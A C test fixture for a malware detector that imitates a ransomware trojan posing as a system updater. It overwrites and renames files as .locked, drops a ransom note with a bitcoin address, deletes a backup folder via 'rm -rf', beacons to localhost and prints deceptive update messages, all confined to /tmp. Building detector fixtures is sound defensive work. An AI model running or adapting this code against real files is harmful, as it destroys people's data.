/* Sandbox fixture: a trojan that looks like a system updater.
 *
 * This is a BEHAVIOURAL test fixture for HyprNova's detectors -- it exercises
 * the real primitives ransomware uses (mass high-entropy rewrite, ransom note,
 * backup destruction, C2 beacon attempts, a packed-looking body) without
 * containing any real malware or the EICAR test string. It damages ONLY
 * /tmp/sbx/victims and /tmp/sbx/fakebackup, and only when run by hand.
 *
 * Build: cc -O0 -o systemupdate systemupdate.c
 */
#include "payload_blob.h"

#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#define VICTIM_DIR   "/tmp/sbx/victims"
#define BACKUP_DIR   "/tmp/sbx/fakebackup"
#define STAGE2_PATH  "/tmp/sbx/.cache/stage2.bin"

static void log_line(const char *what) {
    fputs(what, stdout);
    fflush(stdout);
}

/* Phase 1: unpack a "second stage" to a hidden cache path (real droppers do).
 * The bytes are random data; writing them is what trips entropy analysis. */
static void drop_stage2(void) {
    log_line("[systemupdate] verifying update signature...\n");
    mkdir("/tmp/sbx/.cache", 0755);
    int fd = open(STAGE2_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (fd >= 0) {
        for (int i = 0; i < 4; ++i)
            (void)write(fd, kPackedStage2, sizeof(kPackedStage2));
        close(fd);
    }
}

/* Phase 2: the payload. Rewrite every victim file with high-entropy bytes and
 * append the .locked extension -- the classic encrypt-and-rename pass. */
static long encrypt_pass(void) {
    log_line("[systemupdate] applying performance optimizations...\n");
    long done = 0;
    DIR *dir = opendir(VICTIM_DIR);
    if (!dir) return 0;
    struct dirent *ent;
    char src[512], dst[512], note[600];
    while ((ent = readdir(dir)) != NULL) {
        if (ent->d_name[0] == '.') continue;
        snprintf(src, sizeof(src), VICTIM_DIR "/%s", ent->d_name);
        snprintf(dst, sizeof(dst), "%s.locked", src);
        FILE *in = fopen(src, "rb");
        if (!in) continue;
        fclose(in);
        int fd = open(src, O_WRONLY | O_TRUNC);
        if (fd >= 0) {
            for (int i = 0; i < 3; ++i) (void)write(fd, kPackedStage2, sizeof(kPackedStage2));
            close(fd);
        }
        rename(src, dst);
        ++done;
        if (done >= 12) break;
    }
    closedir(dir);

    /* Phase 3: the ransom note. */
    snprintf(note, sizeof(note),
             VICTIM_DIR "/README_RESTORE.txt");
    FILE *n = fopen(note, "w");
    if (n) {
        fputs("ALL YOUR FILES HAVE BEEN ENCRYPTED!\n"
              "send 0.5 bitcoin to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n"
              "we also deleted your shadow copies. recovery is impossible.\n"
              "YOUR FILES are safe until the timer expires.\n", n);
        fclose(n);
    }
    return done;
}

/* Phase 4: destroy the backups (this is why ransomware works). */
static void destroy_backups(void) {
    log_line("[systemupdate] cleaning obsolete packages...\n");
    (void)system("/bin/sh -c 'rm -rf " BACKUP_DIR "' >/dev/null 2>&1");
}

/* Phase 5: beacon home (attempts fail here; the pattern is what matters). */
static void beacon_loop(void) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(19099);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    for (int i = 0; i < 30; ++i) {
        (void)connect(sock, (struct sockaddr *)&addr, sizeof(addr));
        log_line("[systemupdate] update check complete. next check scheduled.\n");
        struct timespec ts = {2, 0};
        nanosleep(&ts, NULL);
    }
    close(sock);
}

int main(void) {
    log_line("[systemupdate] starting scheduled system maintenance...\n");
    /* keep a low-entropy decoy running past detectors that profile early */
    struct timespec ts = {0, 300000000};
    nanosleep(&ts, NULL);

    drop_stage2();
    encrypt_pass();
    destroy_backups();
    log_line("[systemupdate] maintenance finished. keeping the updater resident.\n");
    beacon_loop();
    return 0;
}
